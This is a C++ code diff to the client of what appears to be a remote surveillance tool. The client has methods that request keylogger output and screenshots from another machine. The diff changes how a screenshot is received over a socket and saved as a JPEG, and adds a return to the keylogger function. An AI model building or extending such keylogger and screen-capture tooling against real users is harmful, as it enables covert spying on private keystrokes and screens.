@@ -100,6 +100,7 @@ bool  Client::sendKeyloggerRequest(){
         Sleep(10); 
     }
     outFile.close();
+    return true;
 }
    
 bool Client::sendScreenshotRequest()
@@ -112,26 +113,40 @@ bool Client::sendScreenshotRequest()
         return false;
     }
 
-    // Step 2: Receive the screenshot data
-    char buffer[1024]; // Adjust size as necessary
-    std::ofstream outFile("received_screenshot.png", std::ios::binary);
-    if (!outFile) {
-        std::cerr << "Error opening file for writing." << std::endl;
-        return false;
-    }
+    // // Step 2: Receive the screenshot data
+    // char buffer[1024]; // Adjust size as necessary
+    // std::ofstream outFile("received_screenshot.png", std::ios::binary);
+    // if (!outFile) {
+    //     std::cerr << "Error opening file for writing." << std::endl;
+    //     return false;
+    // }
 
-    // Assume the server sends the size first
-    int bytesReceived;
-    while ((bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
-        outFile.write(buffer, bytesReceived); // Write the received data to the file
-    }
+    // // Assume the server sends the size first
+    // int bytesReceived;
+    // while ((bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
+    //     outFile.write(buffer, bytesReceived); // Write the received data to the file
+    // }
 
-    if (bytesReceived < 0) {
-        std::cerr << "Receive failed: " << WSAGetLastError() << std::endl;
-        return false;
-    }
+    // if (bytesReceived < 0) {
+    //     std::cerr << "Receive failed: " << WSAGetLastError() << std::endl;
+    //     return false;
+    // }
 
+    // outFile.close();
+    // std::cout << "Screenshot received and saved as received_screenshot.png" << std::endl;
+    // return true;
+
+    uint32_t dataSize;
+    recv(clientSocket, reinterpret_cast<char*>(&dataSize), sizeof(dataSize), 0);
+    dataSize = ntohl(dataSize);
+
+    std::vector<unsigned char> imageData(dataSize);
+    recv(clientSocket, reinterpret_cast<char*>(imageData.data()), dataSize, 0);
+
+    std::ofstream outFile("received_screenshot.jpg", std::ios::binary);
+    outFile.write(reinterpret_cast<char*>(imageData.data()), imageData.size());
     outFile.close();
-    std::cout << "Screenshot received and saved as received_screenshot.png" << std::endl;
+
+    std::cout << "Screenshot received and saved as 'received_screenshot.jpg'" << std::endl;
     return true;
 }
